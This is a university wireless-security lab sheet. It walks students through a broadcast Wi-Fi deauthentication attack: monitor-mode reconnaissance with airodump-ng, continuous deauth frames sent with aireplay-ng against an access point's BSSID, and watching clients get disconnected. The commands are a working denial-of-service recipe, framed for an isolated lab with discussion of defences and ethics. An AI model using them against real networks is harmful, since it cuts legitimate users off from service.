
## Module Code: 6CSEF005W  
**Module name:** Wireless Network Security  
**Lab activity:** Broadcast Deauthentication Attack  
**Author:** Dr Ayman El Hajjar  

---

#  Lab Activity: Deauthentication Jamming Attack (Broadcast)

---
## How todo this lab

In this lab you are working in pairs. 
- One pc will act as the attacker
- Another PC will act as the Access Point

###  Objective

In this lab, you will perform a broadcast deauthentication attack that targets all clients connected to a specific wireless access point. This demonstrates how attackers can cause denial of service (DoS) by abusing the Wi-Fi protocol.

---

###  Warning

Deauthentication attacks disrupt wireless networks. Run this only in an isolated lab environment.

---

## Access point steps

- go to the respository
```bash
cd 6CSEF005W/APconfigs
```

- Run the AP by tying:
```bash
chmod +x setup_ap_open.sh
sudo ./setup_ap_open.sh
```



## Attacker steps

##  Step 1: Identify Target AP

Use `airodump-ng` to gather the BSSID and channel:

```bash
sudo airmon-ng start wlan0
sudo airodump-ng wlan0mon
```

> Note down the **BSSID** and **channel** of the AP to target.

---

## 🔥 Step 2: Launch Broadcast Deauth Attack

Use the provided script:

```bash
sudo ./deauth_jammer.sh wlan0mon <BSSID>
```

Or run manually:

```bash
sudo aireplay-ng --deauth 0 -a <BSSID> wlan0mon
```

> This will send continuous deauth frames to all connected clients.

---

##
 Step 3: Observe Client Disconnections

On the victim device:
- Check if Wi-Fi disconnects automatically
- Try reconnecting — it may repeatedly fail
- Observe `airodump-ng` for drops in connected clients

---

##
 Discussion Points

- Why does this attack work even with WPA2?
- How can organisations protect against it?
- What are the legal/ethical implications of using jamming tools?

---

##
 Cleanup

```bash
sudo pkill aireplay-ng
sudo airmon-ng stop wlan0mon
```

---

##  Optional Screenshots

Include in `tasks/img/`:
- `airodump-ng` before/after
- Aireplay-ng output

---

## Summary


| Phase     | Tool               | Purpose                            |
|-----------|--------------------|------------------------------------|
| Recon     | `airodump-ng`      | Identify AP and channel            |
| Attack    | `aireplay-ng`      | Broadcast deauth frames            |
| Observe   | Client Wi-Fi status| Check disconnects and reconnection |

---
